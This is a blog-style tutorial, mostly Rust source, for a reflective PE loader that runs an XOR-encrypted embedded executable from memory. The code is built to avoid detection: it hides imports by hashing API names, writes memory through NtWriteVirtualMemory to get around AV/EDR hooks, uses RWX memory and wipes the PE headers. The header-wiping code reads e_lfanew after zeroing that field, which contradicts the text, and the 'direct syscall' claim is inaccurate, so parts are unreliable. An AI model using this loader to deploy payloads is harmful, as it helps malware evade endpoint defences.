+++
title = "Writing a Reflective PE Loader in Rust"
date = 2025-09-20T00:00:00Z
draft = false
description = "Implementing a reflective PE loader in no_std Rust: XOR-encrypted payload, dynamic API resolution via hash, manual section mapping, IAT patching, relocations and header wiping."
tags = ["rust", "windows", "security"]
+++

Reflective loading is a technique for executing a PE (EXE or DLL) directly from memory without going through the Windows loader. I built one in Rust a while back, mostly just for fun. The first version used the standard library normally, but then I wanted to see how far I could push it, so I rewrote the whole thing as `no_std`. No C runtime, no allocator, just raw pointers and syscalls. This is a writeup of how it works.

## Project setup and payload embedding
First, we need a payload to load. I built a simple "Hello, world" message box app.
We don't want to load it from disk, so we embed it directly into the loader's binary using a `build.rs` script that runs at compile time.
It reads the payload file, XOR-encrypts it, and writes the result to `OUT_DIR`. Our main code can then include these bytes.

```rust
// build.rs
use std::env;
use std::fs;
use std::path::Path;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let payload_path = Path::new("path/to/your/payload.exe");
    let mut payload_bytes = fs::read(payload_path).unwrap();

    let key = 0xAA;
    for byte in &mut payload_bytes {
        *byte ^= key;
    }
  
    let dest_path = Path::new(&out_dir).join("payload.enc");
    fs::write(&dest_path, payload_bytes).unwrap();
}

```

In `main.rs`, we can now include the encrypted payload and define a buffer to decrypt it into at runtime.

```rust
// src/main.rs
const PAYLOAD_SIZE: usize = include_bytes!(concat!(env!("OUT_DIR"), "/payload.enc")).len();
static ENCRYPTED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.enc"));
static mut PAYLOAD_BUF: [u8; PAYLOAD_SIZE] = [0; PAYLOAD_SIZE];
const XOR_KEY: u8 = 0xAA;

fn decrypt_payload() -> &'static [u8] {
    unsafe {
        // Copy encrypted payload to a mutable buffer
        let dst = &raw mut PAYLOAD_BUF as *mut [u8; PAYLOAD_SIZE] as *mut u8;
        let src = ENCRYPTED_PAYLOAD.as_ptr();
        core::ptr::copy_nonoverlapping(src, dst, PAYLOAD_SIZE);
        
        // Decrypt in place
        for i in 0..PAYLOAD_SIZE {
            *dst.add(i) ^= XOR_KEY;
        }
        
        // Return a slice to the decrypted buffer
        core::slice::from_raw_parts(dst, PAYLOAD_SIZE)
    }
}
```

## Dynamic API resolution
The loader doesn't import WinAPI functions directly, that would make static analysis too easy. Instead we resolve everything at runtime by hashing function names and comparing against pre-computed values.
### FNV-1a hashing
We need a fast hash for function name lookups. FNV-1a works well here:

```rust
pub fn fnv1a_hash(s: &[u8]) -> u32 {
    let mut hash = 0x811c9dc5u32; // FNV offset basis
    for &b in s {
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193); // FNV prime
    }
    hash
}
```
Takes a function name as bytes (e.g., "CreateThread") and produces a non-reversible 32-bit hash.

### get_proc_by_hash
This function takes a module name (e.g. `kernel32.dll`) and a target hash, then walks the module's export table to find the matching function address.

#### Step 1. Obtain module handle
We call `GetModuleHandleA` to get the base address of the DLL (it's already loaded in the process).
```rust
let h_mod = GetModuleHandleA(module_name); 
let dos = h_mod as *const u8;
```

#### Step 2. Parse the PE header
From the base address, we parse the PE structure: read the `IMAGE_DOS_HEADER`, grab `e_lfanew` at offset 0x3C to find where `IMAGE_NT_HEADERS` lives, and calculate its absolute address.
```rust
let nt = dos.add(*(dos.add(0x3C) as *const u32) as usize);
```

#### Step 3. Locate the export directory
Now we need the Export Address Table. The first data directory in `IMAGE_OPTIONAL_HEADER` points to it. We read its RVA and add the module base to get a pointer to `IMAGE_EXPORT_DIRECTORY`.
```rust
let export_dir_rva = *(nt.add(0x88) as *const u32);
let export_dir = dos.add(export_dir_rva as usize);
```

#### Step 4. Access export-related arrays
`IMAGE_EXPORT_DIRECTORY` contains RVAs to three critical arrays:
- AddressOfFunctions: An array of RVAs to the exported functions' code.
- AddressOfNames: An array of RVAs to the exported functions' name strings.
- AddressOfNameOrdinals: An array of 16-bit integers that map the AddressOfNames array to the AddressOfFunctions array. [^1]
```rust
let names_rva = *(export_dir.add(0x20) as *const u32);
let names = dos.add(names_rva as usize) as *const u32;
let funcs_rva = *(export_dir.add(0x1C) as *const u32);
let funcs = dos.add(funcs_rva as usize) as *const u32;
let ordinals_rva = *(export_dir.add(0x24) as *const u32);
let ordinals = dos.add(ordinals_rva as usize) as *const u16;

let number_of_names = *(export_dir.add(0x18) as *const u32);
```

#### Step 5. Iterate, hash, compare
We loop through all exported names, hash each one, and check if it matches our target:
```rust
for i in 0..number_of_names {
    let name_rva = *names.add(i as usize);
    let name_ptr = dos.add(name_rva as usize);
    let mut len = 0;
    while *name_ptr.add(len) != 0 {
        len += 1;
    } // calculating the string length
    let name = core::slice::from_raw_parts(name_ptr, len);
    if fnv1a_hash(name) == target_hash { 
		// match found!
    }
```

#### Step 6. Get the function address
Once we have a match, we use the loop index `i` to look up the ordinal, then use that ordinal as an index into the `funcs` array to get the function's RVA. Add the module base and we have our address.
```rust
let ordinal = *ordinals.add(i as usize);
let func_rva = *funcs.add(ordinal as usize);
let func_ptr = dos.add(func_rva as usize);
return Some(func_ptr as *const core::ffi::c_void);
```

## Building the image in memory
Now we have to manually do what the Windows loader does: allocate memory and copy sections into place.
### Allocating virtual memory
We use `NtAllocateVirtualMemory` to get a region for the payload. Ideally we allocate at the executable's preferred `ImageBase` so we can skip relocations, but if that address is taken we just let the kernel pick a spot.
```rust
// src/main.rs
fn allocate_memory(image_base: u64, size: usize) -> *mut c_void {
    unsafe {
        debug!("Allocating {} bytes", size);

        let preferred_base = image_base as *mut c_void;
        let mut baseptr = preferred_base;
        let mut region_size = size;

        let status = (NTALLOC_PTR.unwrap())(
            GetCurrentProcess(),
            &mut baseptr,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if status == STATUS_SUCCESS {
            debug!("NtAllocateVirtualMemory succeeded at preferred base: {:?}", baseptr);
            return baseptr;
        }

        debug!("Preferred base allocation failed, falling back to random base");

        baseptr = core::ptr::null_mut();
        region_size = size;

        let fallback_status = (NTALLOC_PTR.unwrap())(
            GetCurrentProcess(),
            &mut baseptr,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if fallback_status != STATUS_SUCCESS {
            panic!(
                "NtAllocateVirtualMemory fallback failed. NTSTATUS: {:#X} (Value: {})",
                fallback_status, fallback_status
            );
        }

        debug!("Fallback allocation succeeded. Base address: {:?}", baseptr);
        baseptr
    }
}
```
### Copying sections
Next we iterate the section table and map each section to its correct virtual address.

Instead of a plain `memcpy`, we use `NtWriteVirtualMemory` here. It's a direct syscall, which helps avoid user-land hooks that AV/EDR products like to place on higher-level Win32 functions like `WriteProcessMemory`.

For each section:
1. Find its raw data in the payload buffer using `PointerToRawData`.
2. Calculate the destination: section's `VirtualAddress` + base pointer.
3. For the size, take `max(SizeOfRawData, VirtualSize)`. This handles sections like `.bss` that have no on-disk data but need memory space.
4. Write it with `NtWriteVirtualMemory`.

```rust
// src/pe.rs
pub fn write_sections(
    buffer: &[u8],
    baseptr: *mut c_void,
    nt_header: &IMAGE_NT_HEADERS64,
    dos_header: &IMAGE_DOS_HEADER,
) {
    let e_lfanew = dos_header.e_lfanew as usize;
    let section_count = nt_header.FileHeader.NumberOfSections as usize;
    // get a pointer to the first section header
    let section_header = unsafe {
        buffer
            .as_ptr()
            .add(e_lfanew + mem::size_of::<IMAGE_NT_HEADERS64>())
            .cast::<IMAGE_SECTION_HEADER>()
    };

    for _i in 0..section_count {
        let section = unsafe { ptr::read_unaligned(section_header.add(_i)) };
        let section_virtual_address = section.VirtualAddress as usize;
        // determine correct size for the section
        let section_size =
            core::cmp::max(section.SizeOfRawData, unsafe { section.Misc.VirtualSize }) as usize;

        let src = unsafe { buffer.as_ptr().add(section.PointerToRawData as usize) };
		
		// write using syscall
        unsafe {
            let status = (NTWRITE_PTR.unwrap())(
                GetCurrentProcess(),
                baseptr.add(section_virtual_address as usize),
                src as *const c_void,
                section_size,
                ptr::null_mut(),
            );
            if status != 0 {
                panic!("Failed to write section. NTSTATUS: {:#X}", status);
            }
        };
    }
}

```

## Resolving imports (IAT patching)
Sections are in memory but the payload still can't run. Its IAT is full of stale RVAs, we need to fill it with real function addresses.

The import directory is an array of `IMAGE_IMPORT_DESCRIPTOR` structures, one per DLL. Each has:
- `Name`: RVA to the DLL name string (e.g. `"USER32.dll"`)
- `OriginalFirstThunk`: RVA to the Import Lookup Table, an array of `IMAGE_THUNK_DATA64` entries describing what to import
- `FirstThunk`: RVA to the IAT, where we write the resolved addresses

Each thunk entry is either an import by name or by ordinal. The high bit (`IMAGE_ORDINAL_FLAG64`) tells you which.

```rust
// src/iat.rs
pub fn resolve_imports(
    baseptr: *mut c_void,
    nt_header: &IMAGE_NT_HEADERS64,
) {
    unsafe {
        let import_dir_rva = nt_header.OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
            .VirtualAddress;
        if import_dir_rva == 0 {
            return;
        }

        let mut import_descriptor_ptr = baseptr
            .add(import_dir_rva as usize)
            .cast::<IMAGE_IMPORT_DESCRIPTOR>();

        while (*import_descriptor_ptr).Name != 0 {
            let import_descriptor = &*import_descriptor_ptr;
            let dll_name_c_ptr = baseptr.add(import_descriptor.Name as usize) as *const u8;
            let dll_handle = (LOADLIBRARYA_PTR.unwrap())(dll_name_c_ptr);

            let mut thunk_rva = import_descriptor.Anonymous.OriginalFirstThunk;
            if thunk_rva == 0 {
                thunk_rva = import_descriptor.FirstThunk;
            }
            let mut thunk_ptr = baseptr.add(thunk_rva as usize)
                .cast::<IMAGE_THUNK_DATA64>();
            let mut iat_write_ptr = baseptr.add(import_descriptor.FirstThunk as usize)
                .cast::<FARPROC>();

            while thunk_ptr.read().u1.AddressOfData != 0 {
                let thunk_data = core::ptr::read_unaligned(thunk_ptr);
                let resolved: FARPROC;

                if (thunk_data.u1.Ordinal & IMAGE_ORDINAL_FLAG64) != 0 {
                    // Import by ordinal
                    let ordinal = (thunk_data.u1.Ordinal & !IMAGE_ORDINAL_FLAG64) as u16;
                    resolved = (GETPROCADDR_PTR.unwrap())(
                        dll_handle, ordinal as usize as *const u8
                    );
                } else {
                    // Import by name
                    let import_by_name_rva = thunk_data.u1.AddressOfData as u32;
                    let import_by_name_ptr = baseptr
                        .add(import_by_name_rva as usize)
                        .cast::<IMAGE_IMPORT_BY_NAME>();
                    let func_name_ptr = (*import_by_name_ptr).Name.as_ptr();
                    resolved = (GETPROCADDR_PTR.unwrap())(
                        dll_handle, func_name_ptr as *const u8
                    );
                }

                if resolved.is_some() {
                    core::ptr::write_unaligned(iat_write_ptr, resolved);
                }

                thunk_ptr = thunk_ptr.add(1);
                iat_write_ptr = iat_write_ptr.add(1);
            }

            import_descriptor_ptr = import_descriptor_ptr.add(1);
        }
    }
}
```

For each DLL in the import table we call `LoadLibraryA` to load it, then walk its thunk entries and `GetProcAddress` each one into the IAT. Both `LoadLibraryA` and `GetProcAddress` were resolved through our hash-based resolver, so they don't show up in the binary's own imports.

Worth noting: we check `OriginalFirstThunk` first, falling back to `FirstThunk` if it's zero. Some linkers don't bother populating `OriginalFirstThunk`.

## Fixing base relocations
If we got the preferred `ImageBase`, all hardcoded addresses are already correct and we can skip this. But if we ended up at a different base, every absolute address in the payload is wrong by the same delta.

The relocation directory tells us where all these addresses are. It's organized into blocks, each covering a 4KB page. Each block has an array of 16-bit entries where the high 4 bits are the relocation type and the low 12 bits are the offset within the page.

For x64, we mostly care about `IMAGE_REL_BASED_DIR64` (64-bit address that needs adjusting). `IMAGE_REL_BASED_ABSOLUTE` is just padding.

```rust
// src/pe.rs
pub fn fix_relocations(baseptr: *mut c_void, nt_header: &IMAGE_NT_HEADERS64) {
    let preferred_image_base = nt_header.OptionalHeader.ImageBase;
    let actual_image_base = baseptr as u64;
    let delta = actual_image_base.wrapping_sub(preferred_image_base);

    if delta == 0 {
        return; // loaded at preferred base, nothing to fix
    }

    let reloc_dir_entry =
        nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

    if reloc_dir_entry.VirtualAddress == 0 || reloc_dir_entry.Size == 0 {
        return;
    }

    let mut current_reloc_block_ptr = unsafe {
        baseptr
            .add(reloc_dir_entry.VirtualAddress as usize)
            .cast::<IMAGE_BASE_RELOCATION>()
    };
    let reloc_dir_end_ptr =
        unsafe { (current_reloc_block_ptr as *const u8).add(reloc_dir_entry.Size as usize) };

    while unsafe {
        (*current_reloc_block_ptr).VirtualAddress != 0
            && (*current_reloc_block_ptr).SizeOfBlock != 0
    } && (current_reloc_block_ptr as *const u8) < reloc_dir_end_ptr
    {
        let reloc_block = unsafe { *current_reloc_block_ptr };
        let block_base_rva = reloc_block.VirtualAddress;
        let block_size = reloc_block.SizeOfBlock;

        let num_entries =
            (block_size as usize - mem::size_of::<IMAGE_BASE_RELOCATION>()) / mem::size_of::<u16>();
        let entry_ptr = unsafe {
            (current_reloc_block_ptr as *const u8)
                .add(mem::size_of::<IMAGE_BASE_RELOCATION>())
                .cast::<u16>()
        };

        for i in 0..num_entries {
            let entry = unsafe { *entry_ptr.add(i) };
            let reloc_type = (entry >> 12) as u32;
            let reloc_offset = entry & 0x0FFF;

            let fixup_rva = block_base_rva + reloc_offset as u32;
            let fixup_ptr = unsafe { baseptr.add(fixup_rva as usize) };

            match reloc_type {
                IMAGE_REL_BASED_ABSOLUTE => {} // padding, skip
                IMAGE_REL_BASED_DIR64 => {
                    let fixup_value = unsafe { *(fixup_ptr as *const u64) };
                    let new_value = fixup_value.wrapping_add(delta);
                    unsafe {
                        *(fixup_ptr as *mut u64) = new_value;
                    }
                }
                _ => {}
            }
        }

        current_reloc_block_ptr = unsafe {
            (current_reloc_block_ptr as *mut u8)
                .add(block_size as usize)
                .cast::<IMAGE_BASE_RELOCATION>()
        };
    }
}
```

Pretty straightforward in theory: calculate the delta between preferred and actual base, then walk every relocation entry and add that delta to the stored address.

In practice this was the most frustrating part of the whole project. The block format is annoying to get right, you're manually advancing a pointer by `SizeOfBlock` bytes through variable-sized blocks, splitting 16-bit entries into type and offset bits, and if you get the pointer arithmetic even slightly wrong you just walk into garbage data. And when relocations are broken, the payload doesn't give you a nice error, it just crashes. Took a lot of trial and error to get right.

## Wiping PE headers
Before jumping to the entry point, we zero out the PE headers in memory. If something scans our process looking for loaded PEs, it won't find the `MZ`/`PE` signatures.

Three areas to wipe:
1. DOS header, first 0x40 bytes (includes the `MZ` magic)
2. NT headers at `e_lfanew`, 0xF8 bytes (signature + file header + optional header)
3. Section headers right after NT headers, 0x28 bytes each

```rust
// src/pe.rs
pub fn wipe_pe_headers(base_addr: *mut c_void) {
    unsafe {
        // wipe DOS header
        ptr::write_bytes(base_addr, 0, 0x40);

        // wipe NT headers
        let e_lfanew = *(base_addr.add(0x3C) as *const u32);
        let nt_headers = base_addr.add(e_lfanew as usize);
        let size_of_nt_headers = 0xF8;
        ptr::write_bytes(nt_headers, 0, size_of_nt_headers);

        // wipe section headers
        let number_of_sections = *(nt_headers.add(6) as *const u16);
        let section_headers = nt_headers.add(size_of_nt_headers);
        let section_headers_size = number_of_sections as usize * 0x28;
        ptr::write_bytes(section_headers, 0, section_headers_size);
    }
}
```

We read `e_lfanew` and `NumberOfSections` before zeroing the NT headers, obviously, since we still need those values to find the section header array.

## Executing the payload
Now we just jump to the entry point.

```rust
let entrypoint = nt_header.OptionalHeader.AddressOfEntryPoint;
unsafe {
    let entrypoint_func: extern "C" fn() =
        mem::transmute(baseptr.add(entrypoint as usize));
    entrypoint_func();
}
```

`AddressOfEntryPoint` is an RVA, so we add it to our base pointer to get the real address, `transmute` it into a function pointer and call it. The payload takes over from here.

The only WinAPI import that actually shows up in the binary's import table is `GetModuleHandleA`, which we need to bootstrap the hash resolver. Everything else is resolved at runtime.

[^1]: PE Internals Part 1: A few words about Export Address Table: https://ferreirasc.github.io/PE-Export-Address-Table/